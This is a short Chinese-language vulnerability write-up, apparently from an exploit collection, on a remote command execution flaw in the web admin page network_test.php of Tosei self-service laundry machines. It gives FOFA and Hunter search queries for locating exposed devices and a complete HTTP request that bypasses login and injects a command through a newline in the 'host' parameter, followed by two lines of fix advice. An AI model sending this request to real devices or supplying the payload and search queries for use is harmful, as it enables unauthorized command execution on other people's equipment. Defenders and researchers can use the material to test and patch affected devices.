## Tosei network_test.php 远程命令执行漏洞

## 漏洞描述
Tosei 自助洗衣机 Web 管理端 `network_test.php` 提供的连通性检测未对 `host` 参数做过滤，攻击者可绕过认证，通过管道拼接任意系统命令并在设备上执行。

## 网络空间测绘
```
fofa: body="tosei_login_check.php"
hunter: web.body="tosei_login_check.php"
```

## 漏洞复现
```
POST /cgi-bin/login.php/cgi-bin/network_test.php HTTP/1.1
Host: <target ip>
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 26

host=%0aid%0a&command=ping
```
`host` 参数使用换行即可注入命令，返回页面会显示命令输出。

## 修复建议
- 在执行系统命令前做参数白名单校验
- 为调试接口增加身份验证或完全关闭生产可访问性

## 参考
- 社区爆料

